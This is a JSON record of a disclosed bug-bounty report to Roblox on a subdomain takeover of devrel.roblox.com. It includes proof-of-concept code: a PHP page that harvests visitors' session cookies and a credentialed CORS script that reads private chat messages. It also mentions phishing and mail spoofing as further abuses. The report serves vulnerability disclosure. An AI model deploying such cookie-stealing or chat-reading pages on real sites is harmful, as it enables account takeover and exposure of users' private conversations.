{
    "reported_to": "Roblox",
    "reported_by": "geekboy ",
    "title": "Subdomain Takeover to Authentication bypass ",
    "content": "\n## Vulnerability Type:\nSubdomain Takeover\n## Description:\nDue to unclaimed or expired Hubspot instance an attacker is able to claim and serve content from devrel.roblox.com and perform different kind of attacks which i shared in impact section.\n## Affected Area:\nhttp://devrel.roblox.com\n## Steps to Reproduce:\nVisit: https://devrel.roblox.com/subdomain-takeover\n<image_0>\n## Mitigation:\nRemove the CNAME entry for the devrel.roblox.com\nImpact\nLet's talk about about in details, as attacker could possible takeover other users account.\nAs .ROBLOSECURITY cookies is scoped to *.roblox.com means same cookies shared with all other subdomain, i'm not much familiar with hubspot with hosting following code on will steal all the users cookie who visit this subdomain.\n<image_1>\nsteal_cookie.php\nCode 179 Bytes\n1<html>\n2<body>\n3<?php\n4echo \"Cookies received: <br>\";\n5\n6foreach ($_COOKIE as $key=>$val)\n7  {\n8    echo \"Set-Cookie: $key=$val; Domain=.roblox.com; path=/<br>\\n\";\n9  }\n10?>\n11</body>\n12</html>\nAlso devrel.roblox.com can be used to read all the chats between other users as devrel.roblox.com is also white listed to make CORS request at chat.roblox.com\n<image_2>\nWhich can be done like this:\nCode 542 Bytes\n1\n2<h2>CORS To Read Chat</h2>\n3<div id=\"demo\">\n4<button type=\"button\" onclick=\"cors()\">Chat Reader @ Roblox</button>\n5</div>\n6 \n7<script>\n8function cors() {\n9  var xhttp = new XMLHttpRequest();\n10  xhttp.onreadystatechange = function() {\n11    if (this.readyState == 4 && this.status == 200) {\n12      document.getElementById(\"demo\").innerHTML = document.write(this.responseText);\n13    }\n14  };\n15  xhttp.open(\"GET\", \"https://chat.roblox.com/v2/get-messages?conversationId=469104576&pageSize=3\", true);\n16  xhttp.withCredentials = true;\n17  xhttp.send();\n18}\n19</script>\nApart form all above issue, attacker can do following things as well.\nCreating fake login page for credentials harvesting.\nSharing malicious files using roblox.\nCreating mail account using GSuite to send and recived emails on behalf of *@devrel.roblox.com\n\n",
    "severity": [
        9.4,
        null
    ],
    "bounty": null,
    "weaknesses": [
        "None"
    ],
    "screenshots": {
        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/283/580/8c1428c8ca1d58aaa22caa05f59cab67ff805a53/takeover.PNG?response-content-disposition=attachment%3B%20filename%3D%22takeover.PNG%22%3B%20filename%2A%3DUTF-8%27%27takeover.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5WYD3AC3%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T005756Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD6NP%2FABKgzxmoCcv9sJsI3Et2vkO93301U%2B%2FGtCk9ibQIhAP9zVYFNBTDT7Q1KXlEfz2NCIrWAe5c%2FXVNd0oWdr0PiKrEFCCAQAxoMMDEzNjE5Mjc0ODQ5IgylqlOE8vRpauItn8QqjgW0z%2Fls4%2BcbslpHRjfx3lN0Bpjq3it15r5a7xtKrpdTngvGZBGnkPfr1ChLNsa222HwEYECGpLisEG4BrlRpIgwcdHZHg7KoRhUz69jFx202%2FfAWi2%2FtTmlOK423VacHuHFYR9AIyBMmIrRDqJL9iXC2oNOLAgruVlOkQFU2W8AKErET%2BKdb0V%2F4Uq25HNe6FPOk0JtWSxlKoMRpKB0W2mHewzPXXOzSn64EE7HAzZOWAtm38aRloZaZXE5EKYwp3pwvFNCnITM7S7QSzgMwjFE2cc9Fv2ipL1Zot6BUlRzjV%2FsB36EokF%2FtPIZYCYFZJs6o4Y1QptgKJbeInUBBD3ZttV1TCvLPPYqBbzQ19WY%2FcyauMrBTXYMiPIxPsnee50gAPf2rQ7S9vMfuT89J6LN%2F20V%2BbGKsCfyajYY8H1XoQbGBFz7YCJ9uMhOLUqYE4Zdkh2LsTCmslIBQgiXfFixaJx4l3BxZ5nzhfkOBe5M3fbv9PO7VngkiXZXP6o3rUXohShAsjU2uyWY2iN%2BhHVsGvMYOSmEFF6Ibe7lFbz5naf6IVafaXAjMqJCXoZpB1WLgR0V4dRZ0erKqrklT3cdEOBqUa7XsR5Mab7440kKHRcmu0Vyls9QnrEC%2F18OqPTjvkbo%2Bshdy9lZf%2FZ5qlTAibyYsXEW%2BEkAljoGc8dnkc%2BB%2FYkRxo6E6aU6FPgQ8bsJvgsUyTsqxwfHQJ2OcLh5LXfd4kJfE75ep%2BhU9VR6NYMTX5ivvXgyCuXVdAUMupcWtSGthfBBDcciXJHlrDekXEBXUaX%2BG1%2F%2FjZn4qLnApD7Zuuw%2F%2Bo5MQQGadR2%2BCeqNd1J9hU8jo6V3LHSLBmkr90Vn9DfpRVCEgpZeJQMwy%2BeMvwY6sAHcjw%2Bim5kWozWxabVY77DysEWqSMkpWp%2BUOu%2FPSFXM7HbHrFNR%2FssIFg8oP8ROM0P11G%2BVgVN6ADljZqk9t8vXkGo5FmvKB0Gg%2BWKG8vl1XdWXxOay724qlcnDtcHgQi27sUZ2TPoQ%2BONtmFmbQULynP5vjSM%2BGaUwudRSJTE2XfGCbgPKCjjsz1WdnNvN%2FFu3GZSJ1Ozlf7yWNcQ2oReI2GtE8mK6yhD05obRLTbdyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=499d033323cb43d37907c7f38d9aaeafc67bf51bf388c954ecd64f3d49d94530",
        "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/283/554/40eae3bed14a4ed87a737f4e4d87fcf4e89d7662/shared_cookie.PNG?response-content-disposition=attachment%3B%20filename%3D%22shared_cookie.PNG%22%3B%20filename%2A%3DUTF-8%27%27shared_cookie.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5WYD3AC3%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T005756Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD6NP%2FABKgzxmoCcv9sJsI3Et2vkO93301U%2B%2FGtCk9ibQIhAP9zVYFNBTDT7Q1KXlEfz2NCIrWAe5c%2FXVNd0oWdr0PiKrEFCCAQAxoMMDEzNjE5Mjc0ODQ5IgylqlOE8vRpauItn8QqjgW0z%2Fls4%2BcbslpHRjfx3lN0Bpjq3it15r5a7xtKrpdTngvGZBGnkPfr1ChLNsa222HwEYECGpLisEG4BrlRpIgwcdHZHg7KoRhUz69jFx202%2FfAWi2%2FtTmlOK423VacHuHFYR9AIyBMmIrRDqJL9iXC2oNOLAgruVlOkQFU2W8AKErET%2BKdb0V%2F4Uq25HNe6FPOk0JtWSxlKoMRpKB0W2mHewzPXXOzSn64EE7HAzZOWAtm38aRloZaZXE5EKYwp3pwvFNCnITM7S7QSzgMwjFE2cc9Fv2ipL1Zot6BUlRzjV%2FsB36EokF%2FtPIZYCYFZJs6o4Y1QptgKJbeInUBBD3ZttV1TCvLPPYqBbzQ19WY%2FcyauMrBTXYMiPIxPsnee50gAPf2rQ7S9vMfuT89J6LN%2F20V%2BbGKsCfyajYY8H1XoQbGBFz7YCJ9uMhOLUqYE4Zdkh2LsTCmslIBQgiXfFixaJx4l3BxZ5nzhfkOBe5M3fbv9PO7VngkiXZXP6o3rUXohShAsjU2uyWY2iN%2BhHVsGvMYOSmEFF6Ibe7lFbz5naf6IVafaXAjMqJCXoZpB1WLgR0V4dRZ0erKqrklT3cdEOBqUa7XsR5Mab7440kKHRcmu0Vyls9QnrEC%2F18OqPTjvkbo%2Bshdy9lZf%2FZ5qlTAibyYsXEW%2BEkAljoGc8dnkc%2BB%2FYkRxo6E6aU6FPgQ8bsJvgsUyTsqxwfHQJ2OcLh5LXfd4kJfE75ep%2BhU9VR6NYMTX5ivvXgyCuXVdAUMupcWtSGthfBBDcciXJHlrDekXEBXUaX%2BG1%2F%2FjZn4qLnApD7Zuuw%2F%2Bo5MQQGadR2%2BCeqNd1J9hU8jo6V3LHSLBmkr90Vn9DfpRVCEgpZeJQMwy%2BeMvwY6sAHcjw%2Bim5kWozWxabVY77DysEWqSMkpWp%2BUOu%2FPSFXM7HbHrFNR%2FssIFg8oP8ROM0P11G%2BVgVN6ADljZqk9t8vXkGo5FmvKB0Gg%2BWKG8vl1XdWXxOay724qlcnDtcHgQi27sUZ2TPoQ%2BONtmFmbQULynP5vjSM%2BGaUwudRSJTE2XfGCbgPKCjjsz1WdnNvN%2FFu3GZSJ1Ozlf7yWNcQ2oReI2GtE8mK6yhD05obRLTbdyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=79a1d3374f6583600dbb290d5efc6da393bb0b69743e2510c6939813c25808a7",
        "image_2": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/283/553/282223c6c9b2c1e300a79c39191d36eb29c5b3ba/reading_chats.PNG?response-content-disposition=attachment%3B%20filename%3D%22reading_chats.PNG%22%3B%20filename%2A%3DUTF-8%27%27reading_chats.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5WYD3AC3%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T005756Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQD6NP%2FABKgzxmoCcv9sJsI3Et2vkO93301U%2B%2FGtCk9ibQIhAP9zVYFNBTDT7Q1KXlEfz2NCIrWAe5c%2FXVNd0oWdr0PiKrEFCCAQAxoMMDEzNjE5Mjc0ODQ5IgylqlOE8vRpauItn8QqjgW0z%2Fls4%2BcbslpHRjfx3lN0Bpjq3it15r5a7xtKrpdTngvGZBGnkPfr1ChLNsa222HwEYECGpLisEG4BrlRpIgwcdHZHg7KoRhUz69jFx202%2FfAWi2%2FtTmlOK423VacHuHFYR9AIyBMmIrRDqJL9iXC2oNOLAgruVlOkQFU2W8AKErET%2BKdb0V%2F4Uq25HNe6FPOk0JtWSxlKoMRpKB0W2mHewzPXXOzSn64EE7HAzZOWAtm38aRloZaZXE5EKYwp3pwvFNCnITM7S7QSzgMwjFE2cc9Fv2ipL1Zot6BUlRzjV%2FsB36EokF%2FtPIZYCYFZJs6o4Y1QptgKJbeInUBBD3ZttV1TCvLPPYqBbzQ19WY%2FcyauMrBTXYMiPIxPsnee50gAPf2rQ7S9vMfuT89J6LN%2F20V%2BbGKsCfyajYY8H1XoQbGBFz7YCJ9uMhOLUqYE4Zdkh2LsTCmslIBQgiXfFixaJx4l3BxZ5nzhfkOBe5M3fbv9PO7VngkiXZXP6o3rUXohShAsjU2uyWY2iN%2BhHVsGvMYOSmEFF6Ibe7lFbz5naf6IVafaXAjMqJCXoZpB1WLgR0V4dRZ0erKqrklT3cdEOBqUa7XsR5Mab7440kKHRcmu0Vyls9QnrEC%2F18OqPTjvkbo%2Bshdy9lZf%2FZ5qlTAibyYsXEW%2BEkAljoGc8dnkc%2BB%2FYkRxo6E6aU6FPgQ8bsJvgsUyTsqxwfHQJ2OcLh5LXfd4kJfE75ep%2BhU9VR6NYMTX5ivvXgyCuXVdAUMupcWtSGthfBBDcciXJHlrDekXEBXUaX%2BG1%2F%2FjZn4qLnApD7Zuuw%2F%2Bo5MQQGadR2%2BCeqNd1J9hU8jo6V3LHSLBmkr90Vn9DfpRVCEgpZeJQMwy%2BeMvwY6sAHcjw%2Bim5kWozWxabVY77DysEWqSMkpWp%2BUOu%2FPSFXM7HbHrFNR%2FssIFg8oP8ROM0P11G%2BVgVN6ADljZqk9t8vXkGo5FmvKB0Gg%2BWKG8vl1XdWXxOay724qlcnDtcHgQi27sUZ2TPoQ%2BONtmFmbQULynP5vjSM%2BGaUwudRSJTE2XfGCbgPKCjjsz1WdnNvN%2FFu3GZSJ1Ozlf7yWNcQ2oReI2GtE8mK6yhD05obRLTbdyA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1bb112a4ce85f7baddeacd1276333a99cc4af4620e6e496c7729664284cf811f"
    },
    "disclosed_date": 1587689400,
    "report_url": "https://hackerone.com/reports/335330",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "MEDIUM",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Visit the subdomain http://devrel.roblox.com to confirm it is unclaimed or expired."
        ],
        [
            2,
            "Claim the subdomain through Hubspot and host malicious content to exploit cookie theft or CORS vulnerabilities."
        ]
    ],
    "vuln_description": "The vulnerability involves a subdomain takeover of devrel.roblox.com due to an unclaimed or expired Hubspot instance. An attacker can claim the subdomain, host malicious content, and exploit the shared .ROBLOSECURITY cookies across *.roblox.com to perform account takeovers, read private chats via CORS, and other malicious activities.",
    "reason": "The attack requires understanding of subdomain takeovers, cookie scoping, and CORS vulnerabilities. However, the steps to exploit are straightforward once the subdomain is identified as vulnerable.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}